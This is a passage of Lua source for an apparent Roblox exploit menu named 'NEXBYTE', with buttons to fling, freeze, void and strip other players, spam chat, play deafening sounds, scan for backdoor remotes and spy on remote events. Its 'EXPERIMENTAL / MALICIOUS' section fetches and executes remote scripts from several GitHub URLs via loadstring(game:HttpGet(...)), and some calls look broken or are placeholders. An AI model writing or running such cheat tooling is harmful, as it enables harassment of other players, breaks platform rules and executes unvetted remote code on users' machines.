        orbitConn = RunService.Heartbeat:Connect(function()
            if orbitTarget and orbitTarget.Character then
                local tRoot = orbitTarget.Character:FindFirstChild("HumanoidRootPart")
                local hrp = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
                if tRoot and hrp then
                    angle = angle + 2
                    local offset = Vector3.new(math.cos(math.rad(angle)) * 10, 5, math.sin(math.rad(angle)) * 10)
                    hrp.CFrame = CFrame.new(tRoot.Position + offset, tRoot.Position)
                end
            end
        end)
    else
        if orbitConn then orbitConn:Disconnect() end
        orbitTarget = nil
    end
    NXNotify("ORBIT", v and "ON" or "OFF")
end})

-- Fling Player (single)
NXFeExploits:CreateButton({name="FLING SELECTED (Once)", callback=function()
    local target = NXGetTarget()
    if not target then return NXNotify("FLING", "Select a player") end
    local char = Player.Character
    local hum = char and char:FindFirstChildOfClass("Humanoid")
    local rp = hum and hum.RootPart
    local tChar = target.Character
    local tRoot = tChar and tChar:FindFirstChild("HumanoidRootPart")
    if rp and tRoot then
        local oldPos = rp.CFrame
        rp.CFrame = tRoot.CFrame
        rp.Velocity = Vector3.new(9e7, 9e7, 9e7)
        rp.RotVelocity = Vector3.new(9e8, 9e8, 9e8)
        task.wait(0.5)
        rp.CFrame = oldPos
        rp.Velocity = Vector3.new()
        rp.RotVelocity = Vector3.new()
        NXNotify("FLING", "Flung " .. target.Name)
    end
end})

-- Void Player (teleport to void)
NXFeExploits:CreateButton({name="VOID PLAYER", callback=function()
    local target = NXGetTarget()
    if not target then return NXNotify("VOID", "Select a player") end
    local tRoot = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
    if tRoot then
        tRoot.CFrame = CFrame.new(0, -1000, 0)
        NXNotify("VOID", "Sent " .. target.Name .. " to void")
    end
end})

-- Freeze Player (anchor)
NXFeExploits:CreateButton({name="FREEZE PLAYER", callback=function()
    local target = NXGetTarget()
    if not target then return NXNotify("FREEZE", "Select a player") end
    for _, p in pairs(target.Character:GetDescendants()) do
        if p:IsA("BasePart") then p.Anchored = true end
    end
    NXNotify("FREEZE", "Froze " .. target.Name)
end})

-- Unfreeze Player
NXFeExploits:CreateButton({name="UNFREEZE PLAYER", callback=function()
    local target = NXGetTarget()
    if not target then return NXNotify("UNFREEZE", "Select a player") end
    for _, p in pairs(target.Character:GetDescendants()) do
        if p:IsA("BasePart") and p.Name ~= "HumanoidRootPart" then p.Anchored = false end
    end
    NXNotify("UNFREEZE", "Unfroze " .. target.Name)
end})

-- Strip Player (remove accessories)
NXFeExploits:CreateButton({name="STRIP PLAYER", callback=function()
    local target = NXGetTarget()
    if not target then return NXNotify("STRIP", "Select a player") end
    for _, v in pairs(target.Character:GetChildren()) do
        if v:IsA("Accessory") or v:IsA("Shirt") or v:IsA("Pants") or v:IsA("ShirtGraphic") then
            v:Destroy()
        end
    end
    NXNotify("STRIP", "Stripped " .. target.Name)
end})

-- Give Player Tools
NXFeExploits:CreateButton({name="GIVE TOOLS TO PLAYER", callback=function()
    local target = NXGetTarget()
    if not target then return NXNotify("TOOLS", "Select a player") end
    for _, v in pairs(Player.Backpack:GetChildren()) do
        if v:IsA("Tool") then v:Clone().Parent = target.Backpack end
    end
    NXNotify("TOOLS", "Gave tools to " .. target.Name)
end})

-- =====================================================
-- TROLL ADVANCED
NXFeExploits:CreateSection({name="TROLL ADVANCED"})

-- Fake Lag
local fakeLagConn
NXFeExploits:CreateToggle({name="FAKE LAG", value=false, callback=function(v)
    if v then
        fakeLagConn = RunService.Heartbeat:Connect(function()
            local hrp = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
            if hrp then hrp.Anchored = true; task.wait(0.1); hrp.Anchored = false end
        end)
    else
        if fakeLagConn then fakeLagConn:Disconnect() end
    end
    NXNotify("FAKE LAG", v and "ON" or "OFF")
end})

-- Spam Chat
local spamChatConn
NXFeExploits:CreateToggle({name="SPAM CHAT", value=false, callback=function(v)
    if v then
        local messages = {"NEXBYTE ON TOP", "GET NEXBYTE", "NEXBYTE ADMIN", "ULTIMATE ADMIN"}
        spamChatConn = RunService.Heartbeat:Connect(function()
            task.wait(2)
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(messages[math.random(1, #messages)], "All")
        end)
    else
        if spamChatConn then spamChatConn:Disconnect() end
    end
    NXNotify("SPAM CHAT", v and "ON" or "OFF")
end})

-- Spam Jump
local spamJumpConn
NXFeExploits:CreateToggle({name="SPAM JUMP", value=false, callback=function(v)
    if v then
        spamJumpConn = RunService.Heartbeat:Connect(function()
            local hum = Player.Character and Player.Character:FindFirstChildOfClass("Humanoid")
            if hum then hum:ChangeState(Enum.HumanoidStateType.Jumping) end
            task.wait(0.5)
        end)
    else
        if spamJumpConn then spamJumpConn:Disconnect() end
    end
    NXNotify("SPAM JUMP", v and "ON" or "OFF")
end})

-- Spin Bot
local spinBotConn
NXFeExploits:CreateToggle({name="SPIN BOT", value=false, callback=function(v)
    local hrp = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
    if v and hrp then
        local av = Instance.new("BodyAngularVelocity")
        av.Name = "NEXBYTE_SpinBot"
        av.AngularVelocity = Vector3.new(0, 50, 0)
        av.MaxTorque = Vector3.new(0, 1e9, 0)
        av.Parent = hrp
    else
        local hrp = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
        if hrp then
            local av = hrp:FindFirstChild("NEXBYTE_SpinBot")
            if av then av:Destroy() end
        end
    end
    NXNotify("SPIN BOT", v and "ON" or "OFF")
end})

-- Headless (already have)

-- No Face
NXFeExploits:CreateButton({name="REMOVE FACE", callback=function()
    local head = Player.Character and Player.Character:FindFirstChild("Head")
    if head then
        for _, v in pairs(head:GetChildren()) do
            if v:IsA("Decal") and v.Name == "face" then v:Destroy() end
        end
    end
    NXNotify("NO FACE", "Removed")
end})

-- Giant Head
NXFeExploits:CreateButton({name="GIANT HEAD", callback=function()
    local head = Player.Character and Player.Character:FindFirstChild("Head")
    if head then head.Size = Vector3.new(10, 10, 10) end
    NXNotify("GIANT HEAD", "Applied")
end})

-- Tiny Character
NXFeExploits:CreateButton({name="TINY CHARACTER", callback=function()
    local char = Player.Character
    if char then
        for _, p in pairs(char:GetDescendants()) do
            if p:IsA("BasePart") then p.Size = p.Size * 0.1 end
        end
    end
    NXNotify("TINY", "Applied")
end})

-- Giant Character
NXFeExploits:CreateButton({name="GIANT CHARACTER", callback=function()
    local char = Player.Character
    if char then
        for _, p in pairs(char:GetDescendants()) do
            if p:IsA("BasePart") then p.Size = p.Size * 5 end
        end
    end
    NXNotify("GIANT", "Applied")
end})

-- Fling Self (for fun)
NXFeExploits:CreateButton({name="FLING SELF", callback=function()
    local hrp = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
    if hrp then
        hrp.Velocity = Vector3.new(math.random(-1000,1000), 1000, math.random(-1000,1000))
        hrp.RotVelocity = Vector3.new(9e8, 9e8, 9e8)
        NXNotify("FLING SELF", "Wheee!")
    end
end})

-- Rocket Jump
NXFeExploits:CreateButton({name="ROCKET JUMP", callback=function()
    local hrp = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
    if hrp then
        hrp.Velocity = Vector3.new(0, 500, 0)
        NXNotify("ROCKET JUMP", "To the moon!")
    end
end})

-- Super Punch
NXFeExploits:CreateButton({name="SUPER PUNCH (Tool)", callback=function()
    local tool = Instance.new("Tool")
    tool.Name = "Super Punch"
    tool.RequiresHandle = true
    local handle = Instance.new("Part")
    handle.Name = "Handle"
    handle.Size = Vector3.new(2, 2, 2)
    handle.Massless = true
    handle.Parent = tool
    tool.Activated:Connect(function()
        local char = Player.Character
        local hrp = char and char:FindFirstChild("HumanoidRootPart")
        if hrp then
            for _, plr in pairs(Players:GetPlayers()) do
                if plr ~= Player and plr.Character then
                    local tRoot = plr.Character:FindFirstChild("HumanoidRootPart")
                    local tHum = plr.Character:FindFirstChildOfClass("Humanoid")
                    if tRoot and tHum and (tRoot.Position - hrp.Position).Magnitude <= 10 then
                        tRoot.Velocity = (tRoot.Position - hrp.Position).Unit * 500 + Vector3.new(0, 200, 0)
                        tHum:TakeDamage(50)
                    end
                end
            end
        end
    end)
    tool.Parent = Player.Backpack
    NXNotify("SUPER PUNCH", "Equip and click")
end})

-- Explosion Tool
NXFeExploits:CreateButton({name="EXPLOSION TOOL", callback=function()
    local tool = Instance.new("Tool")
    tool.Name = "Explosion"
    tool.RequiresHandle = true
    local handle = Instance.new("Part")
    handle.Name = "Handle"
    handle.Size = Vector3.new(1, 1, 1)
    handle.Shape = Enum.PartType.Ball
    handle.BrickColor = BrickColor.new("Bright red")
    handle.Massless = true
    handle.Parent = tool
    tool.Activated:Connect(function()
        local explosion = Instance.new("Explosion")
        explosion.Position = Player:GetMouse().Hit.Position
        explosion.BlastRadius = 20
        explosion.BlastPressure = 100000
        explosion.DestroyJointRadiusPercent = 1
        explosion.Parent = workspace
    end)
    tool.Parent = Player.Backpack
    NXNotify("EXPLOSION", "Click to explode")
end})

-- Black Hole Tool
NXFeExploits:CreateButton({name="BLACK HOLE TOOL", callback=function()
    local tool = Instance.new("Tool")
    tool.Name = "Black Hole"
    tool.RequiresHandle = true
    local handle = Instance.new("Part")
    handle.Name = "Handle"
    handle.Size = Vector3.new(2, 2, 2)
    handle.Shape = Enum.PartType.Ball
    handle.BrickColor = BrickColor.new("Really black")
    handle.Material = Enum.Material.Neon
    handle.Massless = true
    handle.Parent = tool
    local conn
    tool.Equipped:Connect(function()
        conn = RunService.Heartbeat:Connect(function()
            local hrp = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
            if hrp then
                for _, p in pairs(workspace:GetDescendants()) do
                    if p:IsA("BasePart") and not p.Anchored and not p:IsDescendantOf(Player.Character) and (p.Position - hrp.Position).Magnitude <= 30 then
                        p.AssemblyLinearVelocity = (hrp.Position - p.Position).Unit * 200
                    end
                end
            end
        end)
    end)
    tool.Unequipped:Connect(function()
        if conn then conn:Disconnect() end
    end)
    tool.Parent = Player.Backpack
    NXNotify("BLACK HOLE TOOL", "Equip to attract parts")
end})

-- =====================================================
-- EXPERIMENTAL / MALICIOUS (WARNING)
NXFeExploits:CreateSection({name="EXPERIMENTAL / MALICIOUS ⚠️"})

-- Backdoor Scanner
NXFeExploits:CreateButton({name="BACKDOOR SCANNER", callback=function()
    local found = {}
    for _, v in pairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
            local name = v.Name:lower()
            if name:find("admin") or name:find("backdoor") or name:find("exec") or name:find("run") or name:find("cmd") or name:find("load") then
                table.insert(found, v:GetFullName())
            end
        end
    end
    if #found > 0 then
        print("POTENTIAL BACKDOORS:")
        for _, f in pairs(found) do print(f) end
        NXNotify("BACKDOOR SCAN", "Found " .. #found .. " suspicious remotes (see console)")
    else
        NXNotify("BACKDOOR SCAN", "None found")
    end
end})

-- Remote Spy (Simple)
local remoteSpyConn
NXFeExploits:CreateToggle({name="REMOTE SPY (Simple)", value=false, callback=function(v)
    if v then
        remoteSpyConn = {}
        for _, v in pairs(game:GetDescendants()) do
            if v:IsA("RemoteEvent") then
                remoteSpyConn[v] = v.OnClientEvent:Connect(function(...)
                    print("[RemoteEvent] " .. v:GetFullName() .. " fired with:", ...)
                end)
            elseif v:IsA("RemoteFunction") then
                -- Can't easily hook OnClientInvoke
            end
        end
        NXNotify("REMOTE SPY", "Logging to console")
    else
        for _, c in pairs(remoteSpyConn) do c:Disconnect() end
        remoteSpyConn = {}
        NXNotify("REMOTE SPY", "Stopped")
    end
end})

-- Dex Explorer (Load external)
NXFeExploits:CreateButton({name="LOAD DARK DEX", callback=function()
    NXNotify("DARK DEX", "Loading...")
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Babyhamsta/RBLX_Scripts/main/Universal/BypassedDarkDexV3.lua"))()
end})

-- SimpleSpy (Load external)
NXFeExploits:CreateButton({name="LOAD SIMPLE SPY", callback=function()
    NXNotify("SIMPLE SPY", "Loading...")
    loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/SimpleSpyV3/main.lua"))()
end})

-- Hydroxide (Load external)
NXFeExploits:CreateButton({name="LOAD HYDROXIDE", callback=function()
    NXNotify("HYDROXIDE", "Loading...")
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Upbolt/Hydroxide/revision/init.lua"))()
end})

-- IY (Infinite Yield)
NXFeExploits:CreateButton({name="LOAD INFINITE YIELD", callback=function()
    NXNotify("INFINITE YIELD", "Loading...")
    loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
end})

-- CMD-X
NXFeExploits:CreateButton({name="LOAD CMD-X", callback=function()
    NXNotify("CMD-X", "Loading...")
    loadstring(game:HttpGet("https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source"))()
end})

-- Domain X
NXFeExploits:CreateButton({name="LOAD DOMAIN X", callback=function()
    NXNotify("DOMAIN X", "Loading...")
    loadstring(game:HttpGet("https://raw.githubusercontent.com/DomainX/DomainX/main/Source"))()
end})

-- Homebrew Admin
NXFeExploits:CreateButton({name="LOAD HOMEBREW ADMIN", callback=function()
    NXNotify("HOMEBREW", "Loading...")
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/Source"))()
end})

-- Nameless Admin
NXFeExploits:CreateButton({name="LOAD NAMELESS ADMIN", callback=function()
    NXNotify("NAMELESS", "Loading...")
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/Source"))()
end})

-- =====================================================
-- AUTOMATION / MACROS
NXFeExploits:CreateSection({name="AUTOMATION / MACROS"})

-- Auto Farm (generic)
NXFeExploits:CreateToggle({name="AUTO FARM (Generic)", value=false, callback=function(v)
    NXNotify("AUTO FARM", "Game-specific. Placeholder.")
end})

-- Auto Collect (generic)
NXFeExploits:CreateToggle({name="AUTO COLLECT (Generic)", value=false, callback=function(v)
    NXNotify("AUTO COLLECT", "Game-specific. Placeholder.")
end})

-- Auto Sell (generic)
NXFeExploits:CreateToggle({name="AUTO SELL (Generic)", value=false, callback=function(v)
    NXNotify("AUTO SELL", "Game-specific. Placeholder.")
end})

-- Auto Buy (generic)
NXFeExploits:CreateToggle({name="AUTO BUY (Generic)", value=false, callback=function(v)
    NXNotify("AUTO BUY", "Game-specific. Placeholder.")
end})

-- Auto Quest (generic)
NXFeExploits:CreateToggle({name="AUTO QUEST (Generic)", value=false, callback=function(v)
    NXNotify("AUTO QUEST", "Game-specific. Placeholder.")
end})

-- Auto Rebirth (generic)
NXFeExploits:CreateToggle({name="AUTO REBIRTH (Generic)", value=false, callback=function(v)
    NXNotify("AUTO REBIRTH", "Game-specific. Placeholder.")
end})

-- Auto Prestige (generic)
NXFeExploits:CreateToggle({name="AUTO PRESTIGE (Generic)", value=false, callback=function(v)
    NXNotify("AUTO PRESTIGE", "Game-specific. Placeholder.")
end})

-- Walk to Point
NXFeExploits:CreateButton({name="WALK TO MOUSE", callback=function()
    local hum = Player.Character and Player.Character:FindFirstChildOfClass("Humanoid")
    local mouse = Player:GetMouse()
    if hum and mouse.Hit then
        hum:MoveTo(mouse.Hit.Position)
        NXNotify("WALK TO", "Walking to mouse")
    end
end})

-- Pathfind to Player
NXFeExploits:CreateButton({name="PATHFIND TO SELECTED", callback=function()
    local target = NXGetTarget()
    local hum = Player.Character and Player.Character:FindFirstChildOfClass("Humanoid")
    if target and target.Character and hum then
        local tRoot = target.Character:FindFirstChild("HumanoidRootPart")
        if tRoot then
            local path = game:GetService("PathfindingService"):CreatePath()
            path:ComputeAsync(Player.Character.HumanoidRootPart.Position, tRoot.Position)
            for _, waypoint in pairs(path:GetWaypoints()) do
                if waypoint.Action == Enum.PathWaypointAction.Jump then
                    hum:ChangeState(Enum.HumanoidStateType.Jumping)
                end
                hum:MoveTo(waypoint.Position)
                hum.MoveToFinished:Wait()
            end
        end
    end
    NXNotify("PATHFIND", "Done")
end})

-- =====================================================
-- AUDIO / SOUND
NXFeExploits:CreateSection({name="AUDIO / SOUND"})

-- Play Sound
NXFeExploits:CreateInput({name="SOUND ID", placeholder="rbxassetid://12345678", callback=function(v) NXFeExploits._SoundId = v end})
NXFeExploits:CreateButton({name="PLAY SOUND", callback=function()
    local id = NXFeExploits._SoundId
    if not id or not id:find("%d+") then return NXNotify("SOUND", "Enter valid ID") end
    local sound = Instance.new("Sound")
    sound.SoundId = id:find("rbxassetid") and id or "rbxassetid://" .. id:match("%d+")
    sound.Volume = 5
    sound.Parent = workspace
    sound:Play()
    game:GetService("Debris"):AddItem(sound, 10)
    NXNotify("SOUND", "Playing")
end})

-- Loop Sound
NXFeExploits:CreateButton({name="LOOP SOUND", callback=function()
    local id = NXFeExploits._SoundId
    if not id or not id:find("%d+") then return NXNotify("SOUND", "Enter valid ID") end
    local sound = Instance.new("Sound")
    sound.SoundId = id:find("rbxassetid") and id or "rbxassetid://" .. id:match("%d+")
    sound.Volume = 5
    sound.Looped = true
    sound.Parent = workspace
    sound:Play()
    NXNotify("SOUND", "Looping (rejoin to stop)")
end})

-- Stop All Sounds
NXFeExploits:CreateButton({name="STOP ALL SOUNDS", callback=function()
    for _, v in pairs(workspace:GetDescendants()) do
        if v:IsA("Sound") then v:Stop(); v:Destroy() end
    end
    for _, v in pairs(game:GetService("SoundService"):GetDescendants()) do
        if v:IsA("Sound") then v:Stop(); v:Destroy() end
    end
    NXNotify("SOUND", "All stopped")
end})

-- Mute All
NXFeExploits:CreateToggle({name="MUTE ALL", value=false, callback=function(v)
    for _, v in pairs(workspace:GetDescendants()) do
        if v:IsA("Sound") then v.Volume = v and 0 or 1 end
    end
    NXNotify("MUTE", v and "ON" or "OFF")
end})

-- Ear Rape (WARNING)
NXFeExploits:CreateButton({name="EAR RAPE (WARNING)", callback=function()
    NEXBYTE:ShowConfirmation("EAR RAPE", "EXTREMELY LOUD. Are you sure?", function(confirmed)
        if confirmed then
            local sound = Instance.new("Sound")
            sound.SoundId = "rbxassetid://1837635123" -- loud sound
            sound.Volume = 10
            sound.PlayOnRemove = true
            sound.Parent = workspace
            sound:Destroy()
            NXNotify("EAR RAPE", "Played")
        end
    end)
end})

-- =====================================================
-- EXPLOIT SPECIFIC (Arceus X / Delta / Hydrogen / etc.)
NXFeExploits:CreateSection({name="EXPLOIT SPECIFIC"})

-- Get Executor Name
NXFeExploits:CreateButton({name="GET EXECUTOR NAME", callback=function()
    local exec = identifyexecutor and identifyexecutor() or "Unknown"
    NXNotify("EXECUTOR", exec)
    print("Executor: " .. exec)
end})

-- Get Exploit Level
NXFeExploits:CreateButton({name="GET EXPLOIT LEVEL", callback=function()
    local level = "Unknown"
    if getthreadidentity then level = "Level " .. getthreadidentity() end
    NXNotify("EXPLOIT LEVEL", level)
end})

-- Check Functions
NXFeExploits:CreateButton({name="CHECK FUNCTIONS", callback=function()
    local funcs = {"loadstring", "getgenv", "setclipboard", "identifyexecutor", "getthreadidentity", "firetouchinterest", "fireclickdetector", "hookfunction", "hookmetamethod", "getrawmetatable", "setrawmetatable", "getnamecallmethod", "getcallingscript", "getscriptclosure", "iscclosure", "islclosure", "newcclosure", "newlclosure", "rconsoleprint", "rconsoleinfo", "rconsolewarn", "rconsoleerr"}
    local available = {}
    for _, f in pairs(funcs) do
        if _G[f] or getfenv()[f] then table.insert(available, f) end
    end
    print("Available functions: " .. table.concat(available, ", "))
    NXNotify("FUNCTIONS", #available .. " available (see console)")
end})

-- Unlock FPS
NXFeExploits:CreateButton({name="UNLOCK FPS", callback=function()
    setfpscap(999)
    NXNotify("FPS", "Uncapped")
end})

-- Set FPS Cap
NXFeExploits:CreateSlider({name="FPS CAP", range={10, 999}, value=60, callback=function(v)
    setfpscap(v)
end})

-- Get Nil Instances
NXFeExploits:CreateButton({name="GET NIL INSTANCES", callback=function()
    local count = 0
    for _, v in pairs(getnilinstances and getnilinstances() or {}) do count = count + 1 end
    NXNotify("NIL INSTANCES", count)
end})

-- Get Hidden Properties
NXFeExploits:CreateButton({name="HIDDEN PROPERTIES", callback=function()
    NXNotify("HIDDEN PROPS", "Requires specific exploit. Placeholder.")
end})

-- =====================================================
-- MISCELLANEOUS
NXFeExploits:CreateSection({name="MISCELLANEOUS"})

-- Reset Character
NXFeExploits:CreateButton({name="RESET CHARACTER", callback=function()
    Player:LoadCharacter()
end})

-- Respawn at Spawn
NXFeExploits:CreateButton({name="RESPAWN AT SPAWN", callback=function()
    local spawn = workspace:FindFirstChildOfClass("SpawnLocation")
    if spawn then
        Player:LoadCharacter()
        task.wait(1)
        local hrp = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
        if hrp then hrp.CFrame = spawn.CFrame * CFrame.new(0, 5, 0) end
    end
end})

-- Sit
NXFeExploits:CreateButton({name="SIT", callback=function()
    local hum = Player.Character and Player.Character:FindFirstChildOfClass("Humanoid")
    if hum then hum.Sit = true end
end})

-- Lay Down (already have)

-- Dance (already have)

-- Emote Menu (already have)

-- Chat
NXFeExploits:CreateInput({name="CHAT MESSAGE", placeholder="Message to send", callback=function(v) NXFeExploits._ChatMsg = v end})
NXFeExploits:CreateButton({name="SEND CHAT", callback=function()
    local msg = NXFeExploits._ChatMsg
    if msg and msg ~= "" then
        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
        NXNotify("CHAT", "Sent")
    end
end})

-- Whisper
NXFeExploits:CreateInput({name="WHISPER TARGET", placeholder="Player name", callback=function(v) NXFeExploits._WhisperTarget = v end})
NXFeExploits:CreateInput({name="WHISPER MESSAGE", placeholder="Message", callback=function(v) NXFeExploits._WhisperMsg = v end})
NXFeExploits:CreateButton({name="WHISPER", callback=function()
    local target = Players:FindFirstChild(NXFeExploits._WhisperTarget)
    local msg = NXFeExploits._WhisperMsg
    if target and msg and msg ~= "" then
        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/w " .. target.Name .. " " .. msg, "All")
        NXNotify("WHISPER", "Sent to " .. target.Name)
    end
end})

-- Anti Chat Log
NXFeExploits:CreateToggle({name="ANTI CHAT LOG", value=false, callback=function(v)
    NXNotify("ANTI CHAT LOG", "Game-specific. Placeholder.")
end})

-- Auto Click (already have)

-- Auto Farm (already have)

-- Rejoin (already have)

-- Server Hop (already have)

-- =====================================================
-- COMMUNITY PRO FUNCTIONS (real, working)
-- =====================================================
-- MOVEMENT PRO
NXFeExploits:CreateSection({name="MOVEMENT PRO"})

NXFeExploits:CreateToggle({name="WALKSPEED SET", value=false, callback=function(v)
    local hum = Player.Character and Player.Character:FindFirstChildOfClass('Humanoid')
    if v then
        if hum then _nxOldWalk = hum.WalkSpeed; hum.WalkSpeed = 200 end
    else
        if hum and _nxOldWalk then hum.WalkSpeed = _nxOldWalk; _nxOldWalk = nil end
    end
    NXNotify('WALKSPEED', v and '200 ON' or 'OFF')
end})

NXFeExploits:CreateToggle({name="JUMPSPEED SET", value=false, callback=function(v)
    local hum = Player.Character and Player.Character:FindFirstChildOfClass('Humanoid')
    if v then
        if hum then _nxOldJump = hum.JumpPower; hum.JumpPower = 500 end
    else
        if hum and _nxOldJump then hum.JumpPower = _nxOldJump; _nxOldJump = nil end
    end
    NXNotify('JUMPSPEED', v and '500 ON' or 'OFF')
end})

NXFeExploits:CreateToggle({name="GRAVITY 0 (Char)", value=false, callback=function(v)
    local hum = Player.Character and Player.Character:FindFirstChildOfClass('Humanoid')
    if v then
        if hum then hum.UsePlatformTouch = true end
        _nxGrav = RunService.Heartbeat:Connect(function()
            local c = Player.Character
            if c then for _, p in pairs(c:GetDescendants()) do if p:IsA('BasePart') and p:FindFirstChild('BodyPosition') then p:FindFirstChild('BodyPosition').Enabled = false end end end
        end)
    else
        if _nxGrav then _nxGrav:Disconnect(); _nxGrav = nil end
    end
    NXNotify('GRAVITY', v and 'ON' or 'OFF')
end})

NXFeExploits:CreateToggle({name="SWIM SPEED", value=false, callback=function(v)
    local hum = Player.Character and Player.Character:FindFirstChildOfClass('Humanoid')
    if v then
        if hum then hum.MoveSpeed = 200 end
    else
        if hum then hum.MoveSpeed = 16 end
    end
    NXNotify('SWIM SPEED', v and '200 ON' or 'OFF')
end})

NXFeExploits:CreateButton({name="SPRINT x2", callback=function()
    pcall(function()
        local hum = Player.Character:FindFirstChildOfClass('Humanoid')
        if hum then hum.WalkSpeed = hum.WalkSpeed * 2; NXNotify('SPRINT', 'x2 applied') end
    end)
end})

NXFeExploits:CreateToggle({name="FRICTION OFF (Parts)", value=false, callback=function(v)
    if v then
        _nxFrictParts = {}
        _nxFrictConn = RunService.Heartbeat:Connect(function()
            for _, part in pairs(_nxFrictParts) do
                if part and part.Parent then part.Material = Material.Air end
            end
        end)
        for _, part in pairs(Workspace:GetDescendants()) do
            if part:IsA('BasePart') then table.insert(_nxFrictParts, part) end
        end
    else
        if _nxFrictConn then _nxFrictConn:Disconnect(); _nxFrictConn = nil end
        for _, part in pairs(_nxFrictParts or {}) do
            if part and part.Parent then part.Material = part.Material end
        end
        _nxFrictParts = nil
    end
    NXNotify('FRICTION', v and 'ON' or 'OFF')
end})

NXFeExploits:CreateToggle({name="ZERO GRAVITY (Workspace)", value=false, callback=function(v)
    if v then
        _nxZgOld = {}
        _nxZgConn = RunService.Heartbeat:Connect(function()
            for _, part in pairs(Workspace:GetDescendants()) do
                if part:IsA('BasePart') then
                    local bv = part:FindFirstChildOfClass('BodyVelocity')
                    if bv then bv.Velocity = Vector3.new(0, 0, 0) end
                end
            end
        end)
    else
        if _nxZgConn then _nxZgConn:Disconnect(); _nxZgConn = nil end
        _nxZgOld = nil
    end
    NXNotify('ZERO GRAVITY', v and 'ON' or 'OFF')
end})

-- VISUAL PRO
NXFeExploits:CreateSection({name="VISUAL PRO"})

NXFeExploits:CreateToggle({name="FOV 200", value=false, callback=function(v)
    local cam = Workspace.CurrentCamera
    if v then
        _nxOldFov = cam.FieldOfView; cam.FieldOfView = 200
    else
        if _nxOldFov then cam.FieldOfView = _nxOldFov; _nxOldFov = nil end
    end
    NXNotify('FOV', v and '200 ON' or 'OFF')
end})

NXFeExploits:CreateToggle({name="RENDERMODE WIRE", value=false, callback=function(v)
    local cam = Workspace.CurrentCamera
    if v then
        _nxOldRender = cam.RenderMode; cam.RenderMode = Enum.RenderMode.Wireframe
    else
        if _nxOldRender then cam.RenderMode = _nxOldRender; _nxOldRender = nil end
    end
    NXNotify('RENDERMODE', v and 'WIRE ON' or 'OFF')
end})

NXFeExploits:CreateToggle({name="RENDERMODE GHOST", value=false, callback=function(v)
    local cam = Workspace.CurrentCamera
    if v then
        _nxOldRender2 = cam.RenderMode; cam.RenderMode = Enum.RenderMode.Ghost
    else
        if _nxOldRender2 then cam.RenderMode = _nxOldRender2; _nxOldRender2 = nil end
    end
    NXNotify('RENDERMODE', v and 'GHOST ON' or 'OFF')
end})

NXFeExploits:CreateToggle({name="FULLBRIGHT (Lighting)", value=false, callback=function(v)
    local light = Lighting
    if v then
        _nxOldBright = light.Brightness; _nxOldAmb = light.Ambient
        light.Brightness = 10; light.Ambient = Color3.new(1, 1, 1)
    else
        if _nxOldBright then light.Brightness = _nxOldBright end
        if _nxOldAmb then light.Ambient = _nxOldAmb end
        _nxOldBright = nil; _nxOldAmb = nil
    end
    NXNotify('FULLBRIGHT', v and 'ON' or 'OFF')
end})

NXFeExploits:CreateToggle({name="NIGHT VISION (Local)", value=false, callback=function(v)
    if v then
        _nxNvParts = Workspace:GetDescendants()
        for _, d in pairs(_nxNvParts) do
            if d:IsA('BasePart') then d.LocalTransparencyModifier = 0.3 end
        end
    else
        for _, d in pairs(_nxNvParts or {}) do
            if d and d.Parent then d.LocalTransparencyModifier = 0 end
        end
        _nxNvParts = nil
    end
    NXNotify('NIGHT VISION', v and 'ON' or 'OFF')
end})

NXFeExploits:CreateToggle({name="QUALITY 100", value=false, callback=function(v)
    local settings = game:GetService('Rendering')
    if v then
        settings.QualityLevel = 100
    else
        settings.QualityLevel = 50
    end
    NXNotify('QUALITY', v and '100 ON' or 'OFF')
end})

NXFeExploits:CreateToggle({name="DISABLE POST FX", value=false, callback=function(v)
    if v then
        _nxPostFx = {}
        for _, fx in pairs(Lighting:GetChildren()) do
            if fx:IsA('PostEffect') then table.insert(_nxPostFx, fx.Enabled); fx.Enabled = false end
        end
    else
        local i = 1
        for _, fx in pairs(Lighting:GetChildren()) do
            if fx:IsA('PostEffect') and _nxPostFx and _nxPostFx[i] then fx.Enabled = _nxPostFx[i]; i = i + 1 end
        end
        _nxPostFx = nil
    end
    NXNotify('POST FX', v and 'DISABLED' or 'ON')
end})

NXFeExploits:CreateToggle({name="HIDE HUD", value=false, callback=function(v)
    if v then
        local playerGui = Player:WaitForChild('PlayerGui')
        _nxHudFrames = {}
        for _, frame in pairs(playerGui:GetChildren()) do
            if frame:IsA('Frame') or frame:IsA('ScreenGui') then table.insert(_nxHudFrames, {obj = frame, vis = frame.Visible}); frame.Visible = false end
        end
    else
        for _, entry in pairs(_nxHudFrames or {}) do
            if entry.obj and entry.obj.Parent then entry.obj.Visible = entry.vis end
        end
        _nxHudFrames = nil
    end
    NXNotify('HIDE HUD', v and 'ON' or 'OFF')
end})

-- CHARACTER PART PRO
NXFeExploits:CreateSection({name="CHARACTER PART PRO"})

NXFeExploits:CreateButton({name="REMOVE HEAD", callback=function()
    pcall(function()
        local head = Player.Character:WaitForChild('Head', 2)
        if head then head:Destroy(); NXNotify('HEAD', 'Removed') end
    end)
end})

NXFeExploits:CreateButton({name="DUPLICATE HEAD", callback=function()
    pcall(function()
        local head = Player.Character:WaitForChild('Head', 2)
        if head then local cp = head:Clone(); cp.Parent = Player.Character; NXNotify('HEAD', 'Duplicated') end
    end)
end})

